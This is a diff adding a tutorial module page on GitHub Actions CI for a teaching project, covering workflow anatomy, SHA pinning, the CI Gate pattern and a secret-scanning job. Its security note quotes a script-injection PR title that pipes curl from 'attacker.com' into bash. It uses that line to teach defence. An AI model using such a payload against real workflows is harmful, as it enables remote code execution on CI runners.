@@ -1,0 +1,754 @@
+---
+# src/content/docs/modules/05-github-actions/index.mdx
+
+title: "Module 05 · GitHub Actions & CI/CD"
+description: Build the CI pipeline that guards the A2A project. Learn how GitHub Actions workflows are structured, walk through every job in ci.yml, add a new lint step via a PR, and understand why the CI Gate pattern makes branch protection maintainable as a project grows.
+moduleNumber: 5
+duration: "90–120 minutes"
+difficulty: intermediate
+hasSecurityNote: true
+securityConcept: "Secrets in Actions & Least-Privilege Permissions"
+projectStep: "Walk through, run, and extend the A2A CI pipeline"
+prerequisites: ["Module 03 · Pull Requests & Code Review", "Module 04 · Issues, Projects & Discussions"]
+isCore: false
+
+learningObjectives:
+  - Explain the structure of a GitHub Actions workflow file — triggers, jobs, steps, and runners
+  - Read and explain every job in the A2A project's ci.yml
+  - Describe the difference between unit tests and integration tests and why they run on different schedules
+  - Trigger a workflow manually using workflow_dispatch
+  - Add a new job to the CI pipeline via a Pull Request
+  - Explain the CI Gate pattern and why it simplifies branch protection configuration
+---
+
+import { Steps, Tabs, TabItem, Aside } from '@astrojs/starlight/components';
+import ModuleHeader from '@components/ModuleHeader.astro';
+import SecurityNote from '@components/SecurityNote.astro';
+import A2AConnection from '@components/A2AConnection.astro';
+
+<ModuleHeader
+  duration={frontmatter.duration}
+  difficulty={frontmatter.difficulty}
+  prerequisites={frontmatter.prerequisites}
+  objectives={frontmatter.learningObjectives}
+  projectStep={frontmatter.projectStep}
+/>
+
+---
+
+## Background
+
+Every module so far has had a human in the loop — you wrote the code, you ran
+the tests, you reviewed the PR. That works when you're the only contributor.
+It doesn't scale.
+
+**Continuous Integration (CI)** is the practice of running automated checks
+on every proposed change before it merges. A CI pipeline catches broken tests,
+linting failures, and schema mismatches automatically — so reviewers can focus
+on logic and design rather than mechanics.
+
+**GitHub Actions** is GitHub's built-in CI/CD platform. Workflows are defined
+as YAML files in `.github/workflows/` and run on GitHub-hosted virtual machines
+called **runners**. The A2A project already has a fully-built, heavily-commented
+CI pipeline waiting for you. This module is about reading it, understanding it,
+running it, and extending it — not building it from scratch.
+
+<Aside type="note" title="This module reads real code">
+  The primary teaching material in this module is the workflow file itself:
+  `.github/workflows/ci.yml`. Every job, step, and comment was written as a
+  teaching artifact. Open it alongside this page and read both together.
+</Aside>
+
+<A2AConnection
+  step="Run and extend the A2A CI pipeline"
+  files={['.github/workflows/ci.yml', '.github/workflows/nightly.yml']}
+>
+  The A2A project has two workflow files. `ci.yml` runs on every PR and push
+  to `main` — it lints content, tests both the Python and Node.js starter
+  project variants, and validates the A2A message schema. `nightly.yml` runs
+  the full integration test suite every night, starting all services as
+  background processes and making real HTTP calls through the Orchestrator.
+  In this module you'll trigger both, read every line, and add a new job
+  to `ci.yml` via a PR.
+</A2AConnection>
+
+---
+
+## Concepts
+
+### Anatomy of a Workflow File
+
+A GitHub Actions workflow is a YAML file with four top-level sections:
+
+```yaml
+name: CI                  # 1. Name — shown in the Actions tab
+
+on:                       # 2. Triggers — WHEN does this run?
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:      # Manual trigger via the UI
+
+jobs:                     # 3. Jobs — WHAT runs?
+  my-job:
+    runs-on: ubuntu-latest   # 4. Runner — WHERE does it run?
+    steps:
+      - name: Say hello
+        run: echo "Hello from CI"
+```
+
+Each of these sections is covered below.
+
+### Triggers (`on`)
+
+The `on` key controls when the workflow fires. The most common triggers:
+
+| Trigger | When it runs |
+|---------|-------------|
+| `push` | A commit is pushed to the specified branch |
+| `pull_request` | A PR is opened, updated, or reopened |
+| `schedule` | On a cron schedule (e.g. nightly at 02:00 UTC) |
+| `workflow_dispatch` | Manually via the Actions UI or `gh workflow run` |
+| `workflow_call` | Called by another workflow (reusable workflows) |
+
+You can stack multiple triggers — the A2A `ci.yml` uses `push`, `pull_request`,
+and `workflow_dispatch` together. The workflow runs whenever *any* of the
+conditions is met.
+
+**Path filtering** narrows a trigger to only fire when specific files change:
+
+```yaml
+on:
+  push:
+    paths:
+      - "starter-project/**"    # Only run when starter project changes
+      - ".github/workflows/**"  # Or when workflow files change
+```
+
+The `nightly.yml` uses this — it runs on push to `main` only when files
+under `starter-project/` change, avoiding unnecessary nightly re-runs for
+documentation-only commits.
+
+### Jobs and Parallelism
+
+Jobs are the top-level units of work. By default they run **in parallel** —
+all jobs start at the same time on separate runners. This is why the A2A CI
+pipeline is fast despite having seven jobs: linting, testing, and schema
+validation all run simultaneously.
+
+The `needs` keyword creates dependencies between jobs:
+
+```yaml
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps: [...]
+
+  ci-gate:               # This job waits for `test` to finish
+    needs: [test]
+    runs-on: ubuntu-latest
+    steps: [...]
+```
+
+The `ci-gate` job at the bottom of `ci.yml` uses `needs` to wait for every
+other job. It's the one job configured as a required status check in branch
+protection — more on this in Part 3.
+
+### Steps
+
+Steps are the individual commands within a job. Each step either:
+
+- **Runs a shell command** with `run:`
+- **Uses a pre-built action** with `uses:`
+
+```yaml
+steps:
+  - name: Checkout code          # uses a Marketplace action
+    uses: actions/checkout@v4
+
+  - name: Run tests              # runs a shell command
+    run: pytest tests/ -v
+
+  - name: Upload results         # uses an action with inputs
+    uses: actions/upload-artifact@v4
+    with:
+      name: test-results
+      path: coverage.xml
+```
+
+### Runners
+
+A **runner** is the virtual machine that executes a job. GitHub provides:
+
+| Runner | OS | Use for |
+|--------|-----|---------|
+| `ubuntu-latest` | Ubuntu Linux | Most CI tasks — fastest and cheapest |
+| `windows-latest` | Windows Server | Windows-specific testing |
+| `macos-latest` | macOS | macOS-specific testing |
+
+The A2A project uses `ubuntu-latest` throughout. GitHub also supports
+**self-hosted runners** — your own machines registered with GitHub — for
+cases where you need specific hardware or private network access.
+
+### Expressions and Contexts
+
+Workflows use `${{ }}` syntax to access dynamic values:
+
+```yaml
+# Context variables
+${{ github.actor }}          # Username who triggered the run
+${{ github.ref }}            # Branch or tag ref (e.g. refs/heads/main)
+${{ github.event_name }}     # What triggered the run (push, pull_request...)
+${{ github.sha }}            # Full commit SHA
+
+# Secrets
+${{ secrets.MY_SECRET }}     # Repository or org secret
+
+# Previous step outputs
+${{ steps.my-step.outputs.result }}
+
+# Matrix values
+${{ matrix.python-version }}
+```
+
+### Matrix Builds
+
+A **matrix** runs the same job multiple times with different values. The A2A
+`test-python` job uses a matrix to test against Python 3.11 and 3.12
+simultaneously:
+
+```yaml
+strategy:
+  matrix:
+    python-version: ["3.11", "3.12"]
+  fail-fast: false   # Don't cancel 3.12 if 3.11 fails — see both results
+```
+
+This creates two parallel job instances: one for each Python version.
+`fail-fast: false` means both complete even if one fails — you see all
+failures rather than just the first.
+
+### Actions from the Marketplace
+
+The GitHub Marketplace has thousands of pre-built actions. Instead of writing
+a 20-line shell script to set up Python, you use:
+
+```yaml
+- uses: actions/setup-python@v5
+  with:
+    python-version: "3.12"
+    cache: pip
+```
+
+**Pinning to commit SHAs** is a security practice the A2A workflow uses
+throughout. Notice the `ci.yml` format:
+
+```yaml
+uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+```
+
+That long hash is the exact commit SHA of the action — it cannot be changed
+or redirected. A version tag like `@v4` can be moved by the action author
+to point at a different (potentially malicious) commit. Pinning to a SHA
+is immutable. The comment `# v4.2.2` keeps it human-readable. Dependabot
+automatically opens PRs to update these SHAs when new versions are released.
+
+### The CI Gate Pattern
+
+Configure branch protection to require **one** job — `CI Gate` — rather than
+every individual job. The CI Gate job uses `needs` to depend on all other jobs
+and `if: always()` to run even when dependencies fail:
+
+```yaml
+ci-gate:
+  needs: [lint-markdown, lint-yaml, test-python, test-nodejs, validate-schema]
+  if: always()
+  steps:
+    - name: Evaluate results
+      run: |
+        results="${{ join(needs.*.result, ' ') }}"
+        if echo "$results" | grep -qE '(failure|cancelled)'; then
+          exit 1
+        fi
+```
+
+**Why this matters:** without the gate, you must list every job individually
+in the branch protection required status checks UI. Each time you add a new
+job to the pipeline, you must remember to also add it to branch protection.
+With the gate, you add it to the `needs` list in the workflow and branch
+protection configuration never changes.
+
+---
+
+## Exercise
+
+### Part 1 — Read `ci.yml` from Top to Bottom
+
+Before writing a single line, read the existing workflow. Open it alongside
+this page:
+
+```bash
+cat .github/workflows/ci.yml
+```
+
+Or open it in the Codespace editor:
+
+```bash
+code .github/workflows/ci.yml
+```
+
+<Steps>
+1. **Find the triggers.** What three events cause this workflow to run?
+   Why does `workflow_dispatch` exist?
+
+2. **Find the `concurrency` block.** What does `cancel-in-progress: true`
+   do? When would two CI runs for the same branch overlap?
+
+3. **Find the `permissions` block.** Why is `contents: read` the only
+   permission listed at the top level? What could go wrong with
+   `contents: write` as the default?
+
+4. **Count the jobs.** There are seven. List them and describe what each
+   one does in one sentence. Don't look at the comments — read the step
+   names and commands.
+
+5. **Find the matrix.** Which jobs use a matrix? What are the two Python
+   versions being tested? What does `fail-fast: false` do?
+
+6. **Find every `uses:` step.** Notice that every action is pinned to a
+   commit SHA with a version comment. Find the comment for
+   `actions/checkout`. What version is it pinned to?
+
+7. **Find the `ci-gate` job.** What is the `needs` array? What does
+   `if: always()` do and why is it necessary here?
+</Steps>
+
+<Aside type="tip" title="The VS Code GitHub Actions extension">
+  If you installed the recommended Codespace extensions, the
+  **GitHub Actions** extension (ms-vscode.github.actions) gives you
+  syntax highlighting, autocomplete, and inline documentation for
+  workflow files. Hover over any key like `on:` or `uses:` to see
+  the schema description.
+</Aside>
+
+---
+
+### Part 2 — Trigger the Workflow Manually
+
+<Steps>
+1. Navigate to your repository on GitHub → **Actions** tab.
+
+2. In the left sidebar under **Workflows**, click **CI**.
+
+3. Click the **Run workflow** button (top-right of the workflow list).
+   Select `main` as the branch and click **Run workflow**.
+
+4. Refresh the page. A new run appears at the top of the list with a
+   spinning yellow circle — it's running.
+
+5. Click into the run. You'll see the workflow visualisation — each job
+   as a box, with arrows showing the `needs` dependencies. Jobs running
+   in parallel show side by side.
+
+6. Click into the **Test Python Starter Project** job. Expand the
+   **Run unit tests with coverage** step. You're watching live log output
+   from a virtual machine running your tests on GitHub's infrastructure.
+
+7. Wait for all jobs to complete. Examine the results:
+   - Green ✅ — job passed
+   - Red ❌ — job failed (click to see why)
+   - Grey ⊘ — job was skipped (e.g. `check-links` only runs on `push`)
+
+8. Click the **CI Gate** job. Note the `Evaluate CI results` step
+   output — it lists the result of every dependency job and exits 0
+   (success) or 1 (failure) accordingly.
+</Steps>
+
+---
+
+### Part 3 — Trigger via the CLI
+
+<Steps>
+1. In your Codespace terminal, trigger a manual run with the GitHub CLI:
+
+   ```bash
+   gh workflow run ci.yml --ref main
+   ```
+
+2. Watch the run start:
+
+   ```bash
+   gh run list --workflow=ci.yml --limit 3
+   ```
+
+3. Stream the live logs of the most recent run:
+
+   ```bash
+   gh run watch
+   ```
+
+   Press `Ctrl+C` when you've seen enough — the run continues in
+   the background.
+
+4. Once finished, view the summary:
+
+   ```bash
+   gh run view --log-failed
+   ```
+
+   `--log-failed` only shows output from failed steps — useful for
+   quickly finding what broke without scrolling through all the
+   passing steps.
+</Steps>
+
+---
+
+### Part 4 — Read `nightly.yml`
+
+The nightly workflow is a different kind of pipeline — it tests the *running
+system*, not the code in isolation.
+
+```bash
+code .github/workflows/nightly.yml
+```
+
+<Steps>
+1. **Find the `schedule` trigger.** The cron expression is `0 2 * * *`.
+   What does that mean? Use [crontab.guru](https://crontab.guru) to
+   verify your reading.
+
+2. **Find the `workflow_dispatch` inputs.** What is the `target_agent`
+   input used for? Find where it's referenced in the run step.
+
+3. **Find the `timeout-minutes` setting.** Why does the integration test
+   job have a timeout but the unit test job in `ci.yml` doesn't?
+
+4. **Find how services are started.** The Python integration test job
+   starts the Orchestrator and both agents as background processes using
+   `&`. Find the health check loop — why does it poll instead of using
+   a fixed `sleep`?
+
+5. **Find the `if: failure()` step.** What does it do? When does it run?
+   Why is `if: failure()` better than always dumping logs?
+
+6. **Find the `notify-on-failure` job.** It uses `github-script` — a
+   special action that lets you write JavaScript to call the GitHub API
+   directly from a workflow. What API call does it make? What conditions
+   must be true for this job to run?
+</Steps>
+
+---
+
+### Part 5 — Add a New Job to CI
+
+Now you'll extend the pipeline. You'll add a job that validates the A2A
+`.env.example` files — checking that they contain all required variable
+names, and that none of them contains a real API key pattern.
+
+<Steps>
+1. Create a feature branch:
+
+   ```bash
+   git switch main
+   git pull origin main
+   git switch -c feat/ci-validate-env-examples
+   ```
+
+2. Open `ci.yml`:
+
+   ```bash
+   code .github/workflows/ci.yml
+   ```
+
+3. Add this new job **before** the `ci-gate` job. Find the line
+   `# JOB 7: CI Gate` and insert the new job above it:
+
+   ```yaml
+   # ──────────────────────────────────────────────────────────
+   # JOB 7: Validate .env.example Files
+   # Checks that .env.example files contain required variable
+   # names and don't accidentally include real credentials.
+   # ──────────────────────────────────────────────────────────
+   validate-env-examples:
+     name: Validate .env.example files
+     runs-on: ubuntu-latest
+
+     steps:
+       - name: Checkout repository
+         uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+
+       - name: Check .env.example files
+         run: |
+           echo "Checking .env.example files..."
+           FAILED=0
+
+           for f in $(find . -name ".env.example" -not -path "*/node_modules/*"); do
+             echo "Checking $f"
+
+             # Fail if any line looks like a real secret value
+             # (non-placeholder values beside known key names)
+             if grep -qE "(API_KEY|SECRET|TOKEN|PASSWORD)\s*=\s*[a-zA-Z0-9]{20,}" "$f"; then
+               echo "  ❌ FAIL: $f appears to contain a real secret value"
+               FAILED=1
+             else
+               echo "  ✅ PASS: No real secret patterns detected"
+             fi
+
+             # Warn if the file is empty
+             if [ ! -s "$f" ]; then
+               echo "  ⚠️  WARN: $f is empty"
+             fi
+           done
+
+           if [ $FAILED -eq 1 ]; then
+             echo ""
+             echo "One or more .env.example files may contain real credentials."
+             echo "Replace any real values with placeholders like 'your-api-key-here'."
+             exit 1
+           fi
+
+           echo ""
+           echo "All .env.example files look clean."
+   ```
+
+4. Now update the `ci-gate` job's `needs` list to include the new job.
+   Find the `needs:` block in `ci-gate` and add `validate-env-examples`:
+
+   ```yaml
+   ci-gate:
+     needs:
+       - lint-markdown
+       - lint-yaml
+       - test-python
+       - test-nodejs
+       - validate-schema
+       - validate-env-examples   # ← add this line
+   ```
+
+5. Commit and push:
+
+   ```bash
+   git add .github/workflows/ci.yml
+   git commit -m "feat(ci): add .env.example validation job
+
+   Checks that .env.example files don't contain real credential
+   values — catches accidental secret commits before they reach
+   main. Added to ci-gate so branch protection picks it up
+   automatically."
+   git push origin feat/ci-validate-env-examples
+   ```
+
+6. Open a PR. In the description, use the PR template's **Checklist**
+   section and note:
+   - This is a `chore` / CI change, not a lesson content change
+   - The new job is included in the `ci-gate` `needs` list
+
+7. Navigate to the **Actions** tab. Watch the CI run triggered by your PR.
+   Find your new `validate-env-examples` job and confirm it passes.
+
+8. Merge the PR once CI is green.
+</Steps>
+
+---
+
+### Part 6 — Inspect an Artifact
+
+The `test-python` job uploads a coverage report as an artifact. Let's
+download and inspect it.
+
+<Steps>
+1. Go to **Actions** → click the most recent **CI** run.
+
+2. Scroll to the bottom of the run summary page. Under **Artifacts**,
+   you'll see `python-coverage-3.11` and `python-coverage-3.12`.
+
+3. Click to download one. Unzip it — you'll find a `coverage.xml` file.
+
+4. Open it in your editor. It's an XML report of which lines in the
+   Python source files were executed during the tests. This is what
+   a coverage reporting tool like Codecov or Coveralls reads to display
+   a coverage percentage badge on your README.
+
+5. Via the CLI:
+
+   ```bash
+   # List artifacts for the most recent run
+   gh run list --workflow=ci.yml --limit 1 --json databaseId \
+     --jq '.[0].databaseId' | \
+     xargs -I {} gh run download {}
+   ```
+</Steps>
+
+---
+
+## Workflow Patterns Reference
+
+<Tabs>
+  <TabItem label="Conditional Steps">
+    ```yaml
+    # Only run on push to main (not PRs)
+    - name: Deploy
+      if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+      run: ./deploy.sh
+
+    # Only run if a previous step failed
+    - name: Notify on failure
+      if: failure()
+      run: echo "Something broke"
+
+    # Always run (even if previous steps failed)
+    - name: Upload logs
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: logs
+        path: "*.log"
+
+    # Skip on draft PRs
+    - name: Run expensive check
+      if: github.event.pull_request.draft == false
+      run: ./expensive-check.sh
+    ```
+  </TabItem>
+  <TabItem label="Caching">
+    ```yaml
+    # Cache pip dependencies
+    - uses: actions/setup-python@v5
+      with:
+        python-version: "3.12"
+        cache: pip
+        cache-dependency-path: requirements.txt
+
+    # Cache npm dependencies
+    - uses: actions/setup-node@v4
+      with:
+        node-version: "20"
+        cache: npm
+        cache-dependency-path: package-lock.json
+
+    # Manual cache (for anything else)
+    - uses: actions/cache@v4
+      with:
+        path: ~/.cache/myapp
+        key: myapp-${{ hashFiles('**/lockfile') }}
+        restore-keys: myapp-
+    ```
+  </TabItem>
+  <TabItem label="Outputs Between Steps">
+    ```yaml
+    steps:
+      - name: Get version
+        id: version          # Give the step an ID to reference
+        run: |
+          VERSION=$(cat VERSION)
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
+
+      - name: Use version
+        run: echo "Building version ${{ steps.version.outputs.version }}"
+    ```
+  </TabItem>
+  <TabItem label="Scheduled Workflows">
+    ```yaml
+    on:
+      schedule:
+        # Every night at 02:00 UTC
+        - cron: "0 2 * * *"
+
+        # Every Monday at 09:00 UTC
+        - cron: "0 9 * * 1"
+
+        # Every 6 hours
+        - cron: "0 */6 * * *"
+
+    # cron syntax: minute hour day month weekday
+    # Use https://crontab.guru to verify expressions
+    ```
+  </TabItem>
+</Tabs>
+
+---
+
+<SecurityNote concept="Secrets in Actions & Least-Privilege Permissions" module={5} deepDive="actions-secrets">
+  GitHub Actions workflows run with a `GITHUB_TOKEN` that is automatically
+  created for every run. Its permissions are defined at the top of the workflow
+  under `permissions:`. The A2A `ci.yml` sets the default to `contents: read`
+  — the minimum needed for a CI pipeline that only reads code and runs tests.
+
+  **Why least privilege matters here:** a compromised third-party action with
+  `contents: write` permission could push commits to your repository. With
+  `contents: read`, the worst it can do is read your code — which it already
+  has access to by definition. The blast radius of a supply chain attack is
+  directly proportional to the permissions you grant.
+
+  Three specific risks to understand for the A2A pipeline:
+
+  **Script injection via PR title or body.** If a workflow step interpolates
+  `github.event.pull_request.title` directly into a `run:` command, an attacker
+  can open a PR with a title like `foo"; curl attacker.com | bash; echo "` and
+  execute arbitrary code on your runner. The A2A workflows avoid this by never
+  interpolating untrusted user input into `run:` steps. When you need a PR
+  title in a script, assign it to an environment variable first:
+
+  ```yaml
+  # ❌ Vulnerable — direct interpolation
+  run: echo "${{ github.event.pull_request.title }}"
+
+  # ✅ Safe — assigned to env var, shell handles escaping
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "$PR_TITLE"
+  ```
+
+  **Secrets in logs.** GitHub Actions masks secret values in logs — any output
+  that exactly matches a secret value is replaced with `***`. But it doesn't
+  mask derived values. If you compute `echo $SECRET | base64` and print the
+  result, it appears in the log unmasked. Never print, transform, or interpolate
+  secrets in ways that produce derivative values in log output.
+
+  **Pinning actions to commit SHAs.** Tags like `@v4` are mutable — the action
+  author can silently move them to a different commit. A commit SHA is immutable.
+  The A2A workflows pin every `uses:` to a SHA. Dependabot's `github-actions`
+  ecosystem automatically opens PRs to update these SHAs when new versions
+  are released — so you get security patches without losing immutability.
+</SecurityNote>
+
+---
+
+## Summary
+
+In this module you:
+
+- Learned the **structure of a workflow file** — triggers, jobs, steps, runners,
+  and the `${{ }}` expression syntax
+- Read every line of `ci.yml` and understood the purpose of all seven jobs:
+  Markdown linting, YAML linting, link checking, Python tests, Node.js tests,
+  schema validation, and the CI Gate
+- Used **matrix builds** to run the same test job across multiple Python and
+  Node.js versions in parallel
+- Understood why **SHA-pinned actions** are a security requirement, not just
+  a style preference
+- Triggered a workflow manually from the **GitHub UI** and the **`gh` CLI**,
+  and streamed live logs
+- Read `nightly.yml` and understood the difference between unit tests (every PR)
+  and integration tests (nightly scheduled run)
+- Added a new **`validate-env-examples` job** to the CI pipeline via a PR,
+  and updated the CI Gate to include it — demonstrating how the gate pattern
+  makes the pipeline extensible without touching branch protection configuration
+
+The CI pipeline you now understand is the safety net for every PR that follows.
+When it's green, maintainers can trust that tests pass, content is formatted
+consistently, and the A2A schema hasn't drifted. When it's red, the PR stays
+open until it's fixed.
+
+---
+
+## What's Next
+
+**[Module 06 · Security on GitHub →](/modules/06-security/)**
+
+You'll enable the full GitHub security suite on the A2A project — Dependabot
+alerts, Secret Scanning, CodeQL code scanning, and branch protection rulesets.
+You'll write a `CODEOWNERS` file that routes AI agent PRs to the right
+reviewers automatically, and generate a Software Bill of Materials for the
+first versioned release.
